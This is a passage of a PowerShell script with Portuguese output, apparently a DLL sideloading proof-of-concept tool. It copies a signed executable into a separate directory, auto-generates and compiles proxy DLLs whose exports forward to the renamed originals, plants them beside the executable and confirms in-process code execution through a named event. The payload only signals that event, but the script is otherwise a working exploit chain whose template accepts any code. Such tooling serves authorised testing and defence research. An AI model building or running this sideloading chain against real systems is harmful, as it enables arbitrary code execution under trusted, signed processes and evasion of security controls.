if ([string]::IsNullOrWhiteSpace($SideloadDir)) {
    $SideloadDir = Join-Path $env:TEMP "sideload_test_$(Get-Random)"
}
if (-not (Test-Path $SideloadDir)) {
    New-Item -ItemType Directory -Path $SideloadDir -Force | Out-Null
}
$sideloadExe = Join-Path $SideloadDir $ExeName
Write-Ok "Diretorio de sideloading: $SideloadDir"

# Copiar EXE para diretorio de sideloading
Copy-Item $ExePath -Destination $sideloadExe -Force
Write-Ok "EXE copiado: $sideloadExe"

# Copiar DLLs que ja existem no app dir original (dependencias proprietarias)
Get-ChildItem -Path $ExeDir -Filter "*.dll" -EA SilentlyContinue | ForEach-Object {
    $dstDll = Join-Path $SideloadDir $_.Name
    if (-not (Test-Path $dstDll)) {
        Copy-Item $_.FullName -Destination $dstDll -Force
    }
}
# Copiar outros arquivos necessarios (configs, etc)
Get-ChildItem -Path $ExeDir -Include "*.cnf","*.cfg","*.ini","*.conf","*.xml","*.json" -EA SilentlyContinue | ForEach-Object {
    $dstFile = Join-Path $SideloadDir $_.Name
    if (-not (Test-Path $dstFile)) {
        Copy-Item $_.FullName -Destination $dstFile -Force
    }
}

# --- TEMPLATE C (sempre proxy -- sideloading precisa forwarder) ---------------
$cTemplate = @'
#include <windows.h>
/* === EXPORT FORWARDERS (auto-gerados) === */
%%PRAGMAS%%
static volatile LONG g_fired = 0;
static DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(300);
    HANDLE h = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, "%%EVTNAME%%");
    if (h) { SetEvent(h); CloseHandle(h); }
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        if (InterlockedCompareExchange(&g_fired, 1, 0) == 0) {
            HANDLE ht = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    }
    return TRUE;
}
'@

# --- LOOP DE VALIDACAO --------------------------------------------------------
Write-Section "PoC -- VALIDACAO DE SIDELOADING"
Write-Host "  Testando $($tryOrder.Count) DLL(s) em $SideloadDir ..." -ForegroundColor Cyan
Write-Host ""

$validatedDll = $null
$results      = [System.Collections.Generic.List[PSObject]]::new()
$testNum      = 0

foreach ($candidate in $tryOrder) {
    $testNum++
    $cn        = $candidate.Name
    $cb        = [System.IO.Path]::GetFileNameWithoutExtension($cn)
    $cOrigBase = "_orig_$cb"
    $cOrigDll  = "$cOrigBase.dll"
    $cDllOut   = Join-Path $SideloadDir $cn
    $cOrigDst  = Join-Path $SideloadDir $cOrigDll
    $cOrigSrc  = $candidate.OrigPath

    Write-Host ("  [{0,2}/{1}] {2,-28}" -f $testNum, $tryOrder.Count, $cn) -NoNewline -ForegroundColor Cyan

    # Remover copia da DLL original se foi copiada do app dir (vai ser substituida pela proxy)
    if (Test-Path $cDllOut) { Remove-Item $cDllOut -Force }

    # Extrair exports da original
    [System.Collections.Generic.List[string]]$cExports = Get-DllExportNames $cOrigSrc
    $cPragmas = if ($cExports.Count -gt 0) {
        ($cExports | ForEach-Object { "#pragma comment(linker, `"/export:$_=$cOrigBase.$_`")" }) -join "`n"
    } else { "/* sem exports */" }
    $cDefContent = "LIBRARY $($cb.ToUpper())`r`nEXPORTS"
    if ($cExports.Count -gt 0) {
        $cDefContent += "`r`n" + (($cExports | ForEach-Object { "    $_ = $cOrigBase.$_" }) -join "`r`n")
    }
    $evtName = "PSSideload_" + [System.Guid]::NewGuid().ToString("N")
    $cSource = $cTemplate.Replace("%%PRAGMAS%%", $cPragmas).Replace("%%EVTNAME%%", $evtName)

    # Compila em temp
    $tmpDir  = Join-Path $env:TEMP "dll_sideload_poc_$(Get-Random)"
    New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
    $srcFile = Join-Path $tmpDir "poc.c"
    $defFile = Join-Path $tmpDir "poc.def"
    $dllFile = Join-Path $tmpDir $cn
    Set-Content -Path $srcFile -Value $cSource     -Encoding UTF8
    Set-Content -Path $defFile -Value $cDefContent -Encoding ASCII

    $compileOut = @()
    if ($compiler.Type -eq "MSVC") {
        $machineFlag = if ($optMagic -eq 0x20B) { "X64" } else { "X86" }
        $vcvarsName  = if ($optMagic -eq 0x20B) { "vcvars64.bat" } else { "vcvars32.bat" }
        $vcvarsPath  = Join-Path (Split-Path $compiler.Vcvars -Parent) $vcvarsName
        if (-not (Test-Path $vcvarsPath)) { $vcvarsPath = $compiler.Vcvars }
        $clCmd   = "cl /nologo /LD /Fe:`"$dllFile`" /Fo:`"$tmpDir\poc.obj`" `"$srcFile`" /DEF:`"$defFile`" /link /DLL /MACHINE:$machineFlag"
        $batch   = "@echo off`r`ncall `"$vcvarsPath`" >nul 2>&1`r`n$clCmd`r`n"
        $batFile = Join-Path $tmpDir "build.bat"
        Set-Content -Path $batFile -Value $batch -Encoding ASCII
        $compileOut = cmd /c "`"$batFile`"" 2>&1
    } else {
        $bits   = if ($optMagic -eq 0x20B) { "-m64" } else { "-m32" }
        $killAt = if ($optMagic -eq 0x20B) { "" } else { "-Wl,--kill-at" }
        $compileOut = cmd /c "`"$($compiler.Path)`" $bits -shared -o `"$dllFile`" `"$srcFile`" `"$defFile`" -lkernel32 $killAt" 2>&1
    }

    if (-not (Test-Path $dllFile)) {
        Write-Host " falha na compilacao -- pulando." -ForegroundColor Yellow
        $compileOut | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
        $results.Add([PSCustomObject]@{ Name=$cn; Status="CompileErr" })
        Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue
        continue
    }

    # Implantar proxy no diretorio de sideloading + original renomeada
    Copy-Item $dllFile -Destination $cDllOut -Force
    try { [System.IO.File]::Copy($cOrigSrc, $cOrigDst, $true) } catch {}
    Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue

    # Validar: executar EXE do diretorio de sideloading
    Write-Host " testando (10s)..." -NoNewline -ForegroundColor DarkCyan
    $vuln = Test-VulnDll $sideloadExe $evtName 10

    if ($vuln) {
        Write-Host " VULNERAVEL!" -ForegroundColor Green
        $results.Add([PSCustomObject]@{ Name=$cn; Status="VULNERAVEL" })
        $validatedDll = $candidate
        break
    } else {
        Write-Host " sem disparo." -ForegroundColor Yellow
        $results.Add([PSCustomObject]@{ Name=$cn; Status="SemDisparo" })
        Remove-Item $cDllOut  -Force -EA SilentlyContinue
        Remove-Item $cOrigDst -Force -EA SilentlyContinue
    }
}

# --- RESULTADO FINAL ----------------------------------------------------------
Write-Host ""
Write-Section "RESULTADO DA VALIDACAO"
Write-Host ("  {0,-30} {1}" -f "DLL","Resultado") -ForegroundColor DarkCyan
Write-Host ("  {0,-30} {1}" -f ("---"*10),("---"*13)) -ForegroundColor DarkGray
foreach ($r in $results) {
    $color = switch ($r.Status) {
        "VULNERAVEL" { "Green"    }
        "SemDisparo" { "Yellow"   }
        default      { "DarkGray" }
    }
    $label = switch ($r.Status) {
        "VULNERAVEL" { "[OK] VULNERAVEL -- DLL proxy carregada e evento sinalizado" }
        "SemDisparo" { "[--] evento nao sinalizado"           }
        "CompileErr" { "[??] falha de compilacao"              }
    }
    Write-Host ("  {0,-30} {1}" -f $r.Name, $label) -ForegroundColor $color
}
Write-Host ""

if ($validatedDll) {
    $vn       = $validatedDll.Name
    $vb       = [System.IO.Path]::GetFileNameWithoutExtension($vn)
    $vDllOut  = Join-Path $SideloadDir $vn
    $vOrigDst = Join-Path $SideloadDir "_orig_$vb.dll"

    $now = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host ""
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host "  |              DLL SIDELOADING -- VULNERAVEL                   |" -ForegroundColor Green
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host ""
    Write-Host "  EVIDENCIA DE EXPLORACAO" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Data/Hora       : $now" -ForegroundColor White
    Write-Host "  Binario alvo    : $ExeName" -ForegroundColor White
    Write-Host "  Caminho original: $ExePath" -ForegroundColor White
    Write-Host "  Arquitetura     : $arch" -ForegroundColor White
    Write-Host "  Assinatura      : $($sigInfo.Status) [$($sigInfo.Signer)]" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DLL explorada   : $vn" -ForegroundColor White
    Write-Host "  Tipo de import  : $($validatedDll.Type)" -ForegroundColor White
    Write-Host "  Origem original : $($validatedDll.OrigPath)" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Dir sideloading : $SideloadDir" -ForegroundColor White
    Write-Host "  EXE copiado     : $sideloadExe" -ForegroundColor White
    Write-Host "  Proxy implantada: $vDllOut" -ForegroundColor White
    Write-Host "  Original renam. : $vOrigDst" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  DESCRICAO:" -ForegroundColor Yellow
    Write-Host "  O binario '$ExeName' (assinado por $($sigInfo.Signer))" -ForegroundColor White
    Write-Host "  foi copiado para um diretorio controlado pelo atacante." -ForegroundColor White
    Write-Host "  Uma DLL proxy maliciosa ('$vn') foi colocada ao lado do EXE." -ForegroundColor White
    Write-Host "  Ao executar o EXE, o Windows carregou a DLL proxy do diretorio" -ForegroundColor White
    Write-Host "  local ANTES de buscar no System32, executando codigo arbitrario" -ForegroundColor White
    Write-Host "  no contexto do processo assinado." -ForegroundColor White
    Write-Host ""
    Write-Host "  PROVA: o evento nomeado 'PSSideload_*' foi sinalizado pela DLL" -ForegroundColor Green
    Write-Host "  proxy, confirmando execucao de codigo dentro do processo alvo." -ForegroundColor Green
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Remova apos o teste:" -ForegroundColor DarkYellow
    Write-Host "    Remove-Item -Recurse `"$SideloadDir`"" -ForegroundColor White
} else {
    Write-Host "  +==============================================================+" -ForegroundColor Red
    Write-Host "  |  SIDELOADING NAO CONFIRMADO -- Nenhum evento sinalizado.     |" -ForegroundColor Red
    Write-Host "  +==============================================================+" -ForegroundColor Red
    Write-Host ""
    Write-Warn "Possiveis causas:"
    Write-Info "  - AV/EDR bloqueou o carregamento da DLL proxy"
    Write-Info "  - EXE valida integridade/hash das DLLs antes de carregar"
    Write-Info "  - EXE requer DLLs especificas do diretorio original (hardcoded path)"
    Write-Info "  - Processo encerrou antes do payload executar"
    Write-Host ""
    Write-Host "  Remova apos o teste:" -ForegroundColor DarkYellow
    Write-Host "    Remove-Item -Recurse `"$SideloadDir`"" -ForegroundColor White
}
